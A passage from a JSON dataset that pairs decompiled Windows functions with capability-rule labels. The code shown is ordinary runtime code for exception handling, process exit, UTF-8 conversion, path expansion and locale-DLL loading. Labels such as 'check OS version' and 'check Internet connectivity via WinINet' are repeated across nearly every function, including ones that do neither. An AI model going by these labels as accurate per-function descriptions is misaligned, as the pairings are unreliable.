        "decompiled_code": "\nvoid __fastcall fcn.0040330c(int32_t **param_1)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x403390;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    *param_1 = NULL;\n    iVar1 = fcn.004033a0();\n    if (iVar1 != 0) {\n        if (*(iVar1 + 0x14) == 0) {\n            fcn.004032dc();\n            fcn.00405660();\n        }\n        else {\n            *param_1 = in_EAX + *(iVar1 + 0x14);\n            if (*param_1 != NULL) {\n                (**(**param_1 + 4))(*param_1);\n            }\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x403397;\n    uStack32 = 0x40338f;\n    fcn.00405648();\n    return;\n}\n",
        "token_count": 282
    },
    "00403454": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00403454(uint param_1, uint param_2)\n\n{\n    code *UNRECOVERED_JUMPTABLE;\n    uchar in_ZF;\n    \n    fcn.00403424(param_1);\n    if (!in_ZF) {\n    // WARNING: Could not recover jumptable at 0x00403461. Too many branches\n    // WARNING: Treating indirect jump as call\n        (*UNRECOVERED_JUMPTABLE)();\n        return;\n    }\n    if (*0x463028 != NULL) {\n        (**0x463028)();\n    }\n    *0x461004 = param_2;\n    *0x461000 = 0xd2;\n    fcn.00403eb8();\n    return;\n}\n",
        "token_count": 165
    },
    "00403610": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403610(uint param_1, uint param_2)\n\n{\n    uint auStack12 [3];\n    \n    if (*0x461028 != '\\0') {\n        auStack12[0] = param_2;\n        (**0x463014)(0xeedfae4, 0, 2, auStack12);\n    }\n    return;\n}\n",
        "token_count": 84
    },
    "00403e2c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00403e2c(void)\n\n{\n    uint uVar1;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uchar *puStack12;\n    uint uStack8;\n    uchar auStack4 [4];\n    \n    if (*0x463048 != '\\0') {\n        if ((*0x46321c == -0x284e) && (*0x463224 != 0)) {\n            uStack8 = 0x403e55;\n            (**0x463234)();\n        }\n        puStack12 = &stack0xfffffffc;\n        uStack8 = 0;\n        uStack16 = 0x1e;\n        uStack20 = 0x46106c;\n        uStack24 = 0xfffffff5;\n        uStack28 = 0x403e6a;\n        uStack28 = sub.kernel32.dll_GetStdHandle();\n        sub.kernel32.dll_WriteFile();\n        uVar1 = sub.kernel32.dll_GetStdHandle(0xfffffff5, 0x403eb4, 2, &stack0xffffffe4, 0);\n        sub.kernel32.dll_WriteFile(uVar1);\n        return;\n    }\n    if (*0x461030 == '\\0') {\n        uStack8 = 0;\n        puStack12 = 0x461064;\n        uStack16 = 0x46106c;\n        uStack20 = 0;\n        uStack24 = 0x403ea9;\n        sub.user32.dll_MessageBoxA();\n    }\n    return;\n}\n",
        "token_count": 343
    },
    "00403eb8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00403eb8(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    \n    if ((*0x46365c == 0) && (*0x463044 != NULL)) {\n        do {\n            pcVar1 = *0x463044;\n            *0x463044 = NULL;\n            (*pcVar1)();\n        } while (*0x463044 != NULL);\n    }\n    if (*0x461004 != 0) {\n        fcn.00403da0();\n        fcn.00403e2c();\n        *0x461004 = 0;\n    }\n    do {\n        if ((*0x46365c == 2) && (*0x461000 == 0)) {\n            *0x463640 = 0;\n        }\n        fcn.00403c30();\n        if (((*0x46365c < 2) || (*0x461000 != 0)) && (*0x463644 != 0)) {\n            fcn.004055d8();\n            iVar2 = *(*0x463644 + 0x10);\n            if ((iVar2 != *(*0x463644 + 4)) && (iVar2 != 0)) {\n                sub.kernel32.dll_FreeLibrary(iVar2);\n            }\n        }\n        fcn.00403c08();\n        if (*0x46365c == 1) {\n            (**0x463658)();\n        }\n        if (*0x46365c != 0) {\n            fcn.00403dfc();\n        }\n        if (*0x463634 == NULL) {\n            if (*0x463024 != NULL) {\n                (**0x463024)();\n            }\n            sub.kernel32.dll_ExitProcess(*0x461000);\n        }\n        puVar3 = *0x463634;\n        puVar4 = 0x463634;\n        for (iVar2 = 0xb; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar4 = *puVar3;\n            puVar3 = puVar3 + 1;\n            puVar4 = puVar4 + 1;\n        }\n    } while( true );\n}\n",
        "token_count": 486
    },
    "00404a18": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00404a18(void)\n\n{\n    if (*0x46100c != NULL) {\n        (**0x46100c)();\n        return;\n    }\n    fcn.00402818();\n    return;\n}\n",
        "token_count": 49
    },
    "00404a30": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004027ec)\n\nvoid __fastcall fcn.00404a30(int32_t param_1, char *param_2)\n\n{\n    char cVar1;\n    bool bVar2;\n    int32_t iVar3;\n    \n    if (param_1 != 0) {\n        cVar1 = *param_2;\n        if (cVar1 == '\\n') {\n            if (param_1 < 2) {\n                fcn.00403fa8();\n            }\n            else {\n                fcn.00403fcc();\n            }\n        }\n        else if (cVar1 == '\\v') {\n            if (param_1 < 2) {\n                fcn.00404688();\n            }\n            else {\n                fcn.004046a0();\n            }\n        }\n        else if (cVar1 == '\\f') {\n            do {\n                fcn.00404a18();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else if (cVar1 == '\\r') {\n            do {\n                fcn.00404a30();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else if (cVar1 == '\\x0e') {\n            do {\n                fcn.004049e4();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else if (cVar1 == '\\x0f') {\n            do {\n                fcn.00405648();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else {\n            if (cVar1 != '\\x11') {\n                if (*0x463008 != NULL) {\n                    (**0x463008)();\n                }\n                fcn.004027c0();\n                return;\n            }\n            do {\n                fcn.00404f68();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n    }\n    return;\n}\n",
        "token_count": 579
    },
    "00404b28": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00404b28(void)\n\n{\n    if (*0x461014 != NULL) {\n        (**0x461014)();\n        return;\n    }\n    fcn.00402818();\n    return;\n}\n",
        "token_count": 47
    },
    "00404ffc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.00404ffc(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uchar auStack272 [264];\n    \n    if (*(in_EAX + 0x10) == 0) {\n        sub.kernel32.dll_GetModuleFileNameA(*(in_EAX + 4), auStack272, 0x105);\n        iVar1 = fcn.00405238();\n        *(in_EAX + 0x10) = iVar1;\n        if (iVar1 == 0) {\n            *(in_EAX + 0x10) = *(in_EAX + 4);\n        }\n    }\n    return *(in_EAX + 0x10);\n}\n",
        "token_count": 151
    },
    "00405080": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nchar * __cdecl\nfcn.00405080(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint arg_5ch)\n\n{\n    char *in_EAX;\n    int32_t iVar1;\n    code *pcVar2;\n    char *pcVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    uint in_EDX;\n    uint *puVar6;\n    uint lpFileName;\n    uint lpFindFileData;\n    uint lpString2;\n    char *var_ch;\n    uint iMaxLength;\n    char *lpString1;\n    \n    var_ch = in_EAX;\n    iMaxLength = in_EDX;\n    lpString1 = in_EAX;\n    iVar1 = sub.kernel32.dll_GetModuleHandleA(0x405214);\n    if (((iVar1 == 0) || (pcVar2 = sub.kernel32.dll_GetProcAddress(iVar1, 0x405224),  pcVar2 == NULL)) ||\n       (iVar1 = (*pcVar2)(lpString1, &lpFileName, 0x105),  iVar1 == 0)) {\n        if (*lpString1 == '\\\\') {\n            if (lpString1[1] != '\\\\') {\n                return var_ch;\n            }\n            pcVar3 = fcn.0040506c();\n            if (*pcVar3 == '\\0') {\n                return var_ch;\n            }\n            pcVar3 = fcn.0040506c();\n            if (*pcVar3 == '\\0') {\n                return var_ch;\n            }\n        }\n        else {\n            pcVar3 = lpString1 + 2;\n        }\n        iVar1 = pcVar3 - lpString1;\n        puVar6 = &lpFileName;\n        sub.kernel32.dll_lstrcpynA(puVar6, lpString1, iVar1 + 1);\n        while (*pcVar3 != '\\0') {\n            pcVar4 = fcn.0040506c();\n            if (0x105 < pcVar4 + (iVar1 - pcVar3) + 1) {\n                return var_ch;\n            }\n            sub.kernel32.dll_lstrcpynA(&lpFileName + iVar1, pcVar3, pcVar4 + (1 - pcVar3));\n            iVar5 = sub.kernel32.dll_FindFirstFileA(&lpFileName, &lpFindFileData);\n            if (iVar5 == -1) {\n                return var_ch;\n            }\n            sub.kernel32.dll_FindClose(iVar5);\n            iVar5 = sub.kernel32.dll_lstrlenA(&lpString2);\n            if (0x105 < iVar5 + iVar1 + 2) {\n                return var_ch;\n            }\n            *(&lpFileName + iVar1) = 0x5c;\n            sub.kernel32.dll_lstrcpynA(&lpFileName + iVar1 + 1, &lpString2, 0x104 - iVar1);\n            puVar6 = &lpString2;\n            iVar5 = sub.kernel32.dll_lstrlenA();\n            iVar1 = iVar1 + iVar5 + 1;\n            pcVar3 = pcVar4;\n        }\n        sub.kernel32.dll_lstrcpynA(lpString1, &lpFileName, iMaxLength, puVar6);\n    }\n    else {\n        sub.kernel32.dll_lstrcpynA(lpString1, &lpFileName, iMaxLength);\n    }\n    return var_ch;\n}\n",
        "token_count": 843
    },
    "00405238": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.00405238(void)\n\n{\n    uint noname_0;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    char *pcVar4;\n    uint unaff_ESI;\n    uint *in_FS_OFFSET;\n    uint in_stack_fffffe50;\n    uint in_stack_fffffe8c;\n    uint in_stack_fffffe90;\n    uint in_stack_fffffe94;\n    uint in_stack_fffffe98;\n    uint *in_stack_fffffe9c;\n    uint in_stack_fffffea0;\n    uint in_stack_fffffea4;\n    uint in_stack_fffffea8;\n    uint in_stack_fffffeac;\n    uint *noname_12;\n    uint uVar5;\n    uint noname_14;\n    uint noname_15;\n    uint noname_16;\n    uint noname_18;\n    uint *noname_19;\n    uint noname_20;\n    uint lpLibFileName;\n    uint var_18h;\n    uint var_12h;\n    uint var_eh;\n    uint hKey;\n    uint lpString2;\n    \n    noname_20 = 0x105;\n    noname_19 = &fcn.00405238::lpLibFileName;\n    noname_18 = 0;\n    sub.kernel32.dll_GetModuleFileNameA();\n    var_12h._0_1_ = '\\0';\n    puVar3 = &fcn.00405238::hKey;\n    noname_16 = 0xf0019;\n    noname_15 = 0;\n    noname_14 = 0x405468;\n    uVar5 = 0x80000001;\n    noname_12 = 0x405277;\n    iVar1 = sub.advapi32.dll_RegOpenKeyExA();\n    if (iVar1 != 0) {\n        noname_12 = &fcn.00405238::hKey;\n        in_stack_fffffeac = 0xf0019;\n        in_stack_fffffea8 = 0;\n        in_stack_fffffea4 = 0x405468;\n        in_stack_fffffea0 = 0x80000002;\n        in_stack_fffffe9c = 0x405295;\n        iVar1 = sub.advapi32.dll_RegOpenKeyExA();\n        if (iVar1 != 0) {\n            in_stack_fffffe9c = &fcn.00405238::hKey;\n            in_stack_fffffe98 = 0xf0019;\n            in_stack_fffffe94 = 0;\n            in_stack_fffffe90 = 0x405484;\n            in_stack_fffffe8c = 0x80000001;\n            iVar1 = sub.advapi32.dll_RegOpenKeyExA();\n            if (iVar1 != 0) {\n                sub.kernel32.dll_lstrcpynA();\n                uVar5 = sub.kernel32.dll_GetThreadLocale(3, &fcn.00405238::var_eh + 1, 5);\n                sub.kernel32.dll_GetLocaleInfoA(uVar5);\n                iVar1 = 0;\n                if ((lpLibFileName != '\\0') && ((var_eh._1_1_ != '\\0' || (var_12h != '\\0')))) {\n                    iVar2 = sub.kernel32.dll_lstrlenA(&fcn.00405238::lpLibFileName);\n                    for (puVar3 = &fcn.00405238::lpLibFileName + iVar2;\n                        (*puVar3 != '.' && (puVar3 != &fcn.00405238::lpLibFileName)); puVar3 = puVar3 + -1) {\n                    }\n                    if (puVar3 != &fcn.00405238::lpLibFileName) {\n                        pcVar4 = puVar3 + 1;\n                        if (var_12h != '\\0') {\n                            sub.kernel32.dll_lstrcpynA\n                                      (pcVar4, &fcn.00405238::var_12h, 0x105 - (pcVar4 - &fcn.00405238::lpLibFileName));\n                            iVar1 = sub.kernel32.dll_LoadLibraryExA(&fcn.00405238::lpLibFileName, 0, 2);\n                        }\n                        if ((iVar1 == 0) && (var_eh._1_1_ != '\\0')) {\n                            sub.kernel32.dll_lstrcpynA\n                                      (pcVar4, &fcn.00405238::var_eh + 1, \n                                       0x105 - (pcVar4 - &fcn.00405238::lpLibFileName));\n                            iVar1 = sub.kernel32.dll_LoadLibraryExA(&fcn.00405238::lpLibFileName, 0, 2);\n                            if (iVar1 == 0) {\n                                var_eh._3_1_ = 0;\n                                sub.kernel32.dll_lstrcpynA\n                                          (pcVar4, &fcn.00405238::var_eh + 1, \n                                           0x105 - (pcVar4 - &fcn.00405238::lpLibFileName));\n                                iVar1 = sub.kernel32.dll_LoadLibraryExA(&fcn.00405238::lpLibFileName, 0, 2);\n                            }\n                        }\n                    }\n                }\n                return iVar1;\n            }\n        }\n    }\n    noname_0 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffe80;\n    var_18h = 5;\n    fcn.00405080(noname_0, 0x40533d, &stack0xfffffffc, in_stack_fffffe8c, in_stack_fffffe90, in_stack_fffffe94, \n                 in_stack_fffffe98, in_stack_fffffe9c, in_stack_fffffea0, in_stack_fffffea4, in_stack_fffffea8, \n                 in_stack_fffffeac, noname_12, uVar5, noname_14, noname_15, noname_16, puVar3, noname_18, noname_19, \n                 noname_20, unaff_ESI);\n    iVar1 = sub.advapi32.dll_RegQueryValueExA\n                      (hKey, &fcn.00405238::lpLibFileName, 0, 0, &fcn.00405238::var_12h, &fcn.00405238::var_18h);\n    if (iVar1 != 0) {\n        in_stack_fffffe50 = hKey;\n        iVar1 = sub.advapi32.dll_RegQueryValueExA(hKey, 0x4054a4, 0, 0, &fcn.00405238::var_12h, &fcn.00405238::var_18h);\n        if (iVar1 != 0) {\n            var_12h._0_1_ = '\\0';\n        }\n    }\n    var_eh._0_1_ = 0;\n    *in_FS_OFFSET = in_stack_fffffe50;\n    iVar1 = sub.advapi32.dll_RegCloseKey(hKey, 0x405344);\n    return iVar1;\n}\n",
        "token_count": 1558
    },
    "0040556c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0040556c(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    var_8h = *0x461038;\n    if (*0x461038 != NULL) {\n        do {\n            uStack32 = 0x4055a7;\n            uStack36 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &uStack36;\n            puStack28 = &stack0xfffffffc;\n            (*var_8h[1])();\n            *in_FS_OFFSET = uStack36;\n            var_8h = *var_8h;\n        } while (var_8h != NULL);\n    }\n    return;\n}\n",
        "token_count": 176
    },
    "00405758": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00405758(uint32_t arg_8h)\n\n{\n    uint16_t uVar1;\n    int32_t in_EAX;\n    int32_t in_ECX;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    uint32_t in_EDX;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = 0;\n    if (in_ECX != 0) {\n        uVar5 = 0;\n        uVar2 = 0;\n        if (in_EAX == 0) {\n            if (arg_8h != 0) {\n                do {\n                    uVar1 = *(in_ECX + uVar2 * 2);\n                    uVar2 = uVar2 + 1;\n                    if (0x7f < uVar1) {\n                        if (0x7ff < uVar1) {\n                            uVar5 = uVar5 + 1;\n                        }\n                        uVar5 = uVar5 + 1;\n                    }\n                    uVar5 = uVar5 + 1;\n                } while (uVar2 < arg_8h);\n            }\n        }\n        else {\n            while ((uVar2 < arg_8h && (uVar5 < in_EDX))) {\n                uVar1 = *(in_ECX + uVar2 * 2);\n                uVar2 = uVar2 + 1;\n                uVar3 = uVar1;\n                if (uVar1 < 0x80) {\n                    *(in_EAX + uVar5) = uVar3;\n                    uVar5 = uVar5 + 1;\n                }\n                else if (uVar1 < 0x800) {\n                    if (in_EDX < uVar5 + 2) break;\n                    *(in_EAX + uVar5) = uVar1 >> 6 | 0xc0;\n                    *(in_EAX + 1 + uVar5) = uVar3 & 0x3f | 0x80;\n                    uVar5 = uVar5 + 2;\n                }\n                else {\n                    if (in_EDX < uVar5 + 3) break;\n                    *(in_EAX + uVar5) = uVar1 >> 0xc | 0xe0;\n                    *(in_EAX + 1 + uVar5) = uVar1 >> 6 & 0x3f | 0x80;\n                    *(in_EAX + 2 + uVar5) = uVar3 & 0x3f | 0x80;\n                    uVar5 = uVar5 + 3;\n                }\n            }\n            if (in_EDX <= uVar5) {\n                uVar5 = in_EDX - 1;\n            }\n            *(in_EAX + uVar5) = 0;\n        }\n        iVar4 = uVar5 + 1;\n    }\n    return iVar4;\n}\n",
        "token_count": 653
    },
    "00405834": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00405834(uint32_t arg_8h)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    int32_t in_EAX;\n    uint32_t uVar3;\n    int32_t in_ECX;\n    uint32_t uVar4;\n    uint32_t in_EDX;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (in_ECX == 0) {\n        var_10h = 0;\n    }\n    else {\n        uVar3 = 0;\n        uVar5 = 0;\n        if (in_EAX == 0) {\n            if (arg_8h != 0) {\n                do {\n                    uVar6 = uVar5 + 1;\n                    if ((*(in_ECX + uVar5) & 0x80) != 0) {\n                        if (arg_8h <= uVar6) {\n                            return -1;\n                        }\n                        if ((*(in_ECX + uVar5) & 0x20) != 0) {\n                            puVar1 = in_ECX + uVar6;\n                            uVar6 = uVar5 + 2;\n                            if ((*puVar1 & 0xc0) != 0x80) {\n                                return -1;\n                            }\n                            if (arg_8h <= uVar6) {\n                                return -1;\n                            }\n                        }\n                        puVar1 = in_ECX + uVar6;\n                        uVar6 = uVar6 + 1;\n                        if ((*puVar1 & 0xc0) != 0x80) {\n                            return -1;\n                        }\n                    }\n                    uVar3 = uVar3 + 1;\n                    uVar5 = uVar6;\n                } while (uVar6 < arg_8h);\n            }\n        }\n        else {\n            for (; (uVar5 < arg_8h && (uVar3 < in_EDX)); uVar3 = uVar3 + 1) {\n                uVar2 = *(in_ECX + uVar5);\n                uVar6 = uVar5 + 1;\n                if ((uVar2 & 0x80) == 0) {\n                    *(in_EAX + uVar3 * 2) = uVar2;\n                }\n                else {\n                    if (arg_8h <= uVar6) {\n                        return -1;\n                    }\n                    uVar4 = uVar2 & 0x3f;\n                    if ((uVar2 & 0x20) != 0) {\n                        puVar1 = in_ECX + uVar6;\n                        uVar6 = uVar5 + 2;\n                        if ((*puVar1 & 0xc0) != 0x80) {\n                            return -1;\n                        }\n                        if (arg_8h <= uVar6) {\n                            return -1;\n                        }\n                        uVar4 = *puVar1 & 0x3f | uVar4 << 6;\n                    }\n                    puVar1 = in_ECX + uVar6;\n                    uVar6 = uVar6 + 1;\n                    if ((*puVar1 & 0xc0) != 0x80) {\n                        return -1;\n                    }\n                    *(in_EAX + uVar3 * 2) = *puVar1 & 0x3f | uVar4 << 6;\n                }\n                uVar5 = uVar6;\n            }\n            if (in_EDX <= uVar3) {\n                uVar3 = in_EDX - 1;\n            }\n            *(in_EAX + uVar3 * 2) = 0;\n        }\n        var_10h = uVar3 + 1;\n    }\n    return var_10h;\n}\n",
        "token_count": 847
    },
    "00405b64": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00405b64(void)\n\n{\n    uint in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_10h;\n    uint lpLCData;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x405bca;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    uVar1 = 7;\n    sub.kernel32.dll_GetLocaleInfoA();\n    fcn.00404218();\n    fcn.00402c84();\n    *in_FS_OFFSET = in_EAX;\n    fcn.00403fa8(0x405bd1, uVar1);\n    return;\n}\n",
        "token_count": 183
    },
    "00406a4c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00406a4c(uint *arg_8h, uint *arg_ch)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *in_ECX;\n    int32_t *in_EDX;\n    uint var_4h;\n    \n    iVar1 = sub.user32.dll_FindWindowA(0x406afc, 0x406ae8);\n    uVar2 = sub.user32.dll_RegisterWindowMessageA(0x406b04);\n    *in_EAX = uVar2;\n    iVar3 = sub.user32.dll_RegisterWindowMessageA(0x406b14);\n    *in_EDX = iVar3;\n    iVar3 = sub.user32.dll_RegisterWindowMessageA(0x406b2c);\n    *in_ECX = iVar3;\n    if ((*in_EDX == 0) || (iVar1 == 0)) {\n        *arg_ch = 0;\n    }\n    else {\n        uVar2 = sub.user32.dll_SendMessageA(iVar1, *in_EDX, 0, 0);\n        *arg_ch = uVar2;\n    }\n    if ((*in_ECX == 0) || (iVar1 == 0)) {\n        *arg_8h = 3;\n    }\n    else {\n        uVar2 = sub.user32.dll_SendMessageA(iVar1, *in_ECX, 0, 0);\n        *arg_8h = uVar2;\n    }\n    return iVar1;\n}\n",
        "token_count": 341
    },
    "0040cd5c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0040cd5c(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t unaff_EBX;\n    uint32_t uVar4;\n    bool bVar5;\n    \n    uVar4 = CONCAT31(unaff_EBX >> 8, 1);\n    iVar2 = sub.kernel32.dll_GetCurrentThreadId_1();\n    if (iVar2 != *(in_EAX + 0x24)) {\n        fcn.0040cd18();\n        iVar1 = *(in_EAX + 0x28);\n        fcn.0040cb94();\n        bVar5 = *(param_1 + 0xc) != 0;\n        if (bVar5) {\n            fcn.0040cb04();\n        }\n        while( true ) {\n            iVar3 = fcn.0040cb24();\n            if (iVar3 == 0xffff) break;\n            iVar3 = fcn.0040cb24();\n            if (iVar3 != 0) {\n                fcn.0040cd4c();\n            }\n        }\n        fcn.0040cd18();\n        if (bVar5) {\n            fcn.0040cb10();\n        }\n        *(in_EAX + 0x24) = iVar2;\n        iVar2 = fcn.0040cb04();\n        uVar4 = unaff_EBX & 0xffffff00 | iVar2 + -1 == iVar1;\n    }\n    *(in_EAX + 0x1c) = *(in_EAX + 0x1c) + 1;\n    return CONCAT44(param_1, uVar4);\n}\n",
        "token_count": 379
    },
    "00407f8c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
